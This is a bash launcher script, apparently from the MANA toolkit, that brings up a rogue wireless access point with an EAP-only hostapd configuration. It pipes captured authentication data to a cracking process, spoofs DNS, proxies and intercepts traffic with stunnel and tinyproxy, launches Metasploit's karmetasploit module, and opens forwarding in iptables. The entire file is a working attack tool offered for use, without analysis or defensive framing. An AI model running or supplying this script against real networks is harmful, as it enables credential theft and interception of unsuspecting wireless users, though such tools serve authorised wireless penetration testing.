#!/bin/bash
etc=/etc/mana-toolkit
lib=/usr/lib/mana-toolkit
loot=/var/lib/mana-toolkit
share=/usr/share/mana-toolkit

phy=wlan0
conf=$etc/hostapd-mana-eaponly.conf
hostapd=$lib/hostapd
crackapd=$share/crackapd/crackapd.py

hostname WRT54G
echo hostname WRT54G
sleep 2

# Get the FIFO for the crack stuffs. Create the FIFO and kick of python process
export EXNODE=`cat $conf | grep ennode | cut -f2 -d"="`
echo $EXNODE
mkfifo $EXNODE
$crackapd&

service network-manager stop
rfkill unblock wlan

# Start hostapd
sed -i "s/^interface=.*$/interface=$phy/" $conf
sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" $etc/karmetasploit.rc
$hostapd $conf&
sleep 5
ifconfig $phy
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

dnsmasq -z -C $etc/dnsmasq-dhcpd.conf -i $phy -I lo
dnsspoof -i $phy -f $etc/dnsspoof.conf&
service apache2 start
stunnel4 $etc/stunnel.conf
tinyproxy -c $etc/tinyproxy.conf&
msfconsole -r $etc/karmetasploit.rc& #Remove "&" to fix msfconsole exiting

echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F

echo "Hit enter to kill me"
read
pkill hostapd
rm /tmp/crackapd.run
rm $EXNODE
pkill dnsmasq
pkill dnsspoof
pkill tinyproxy
pkill stunnel4
pkill msfconsole
pkill python
pkill ruby
service apache2 stop
iptables -t nat -F
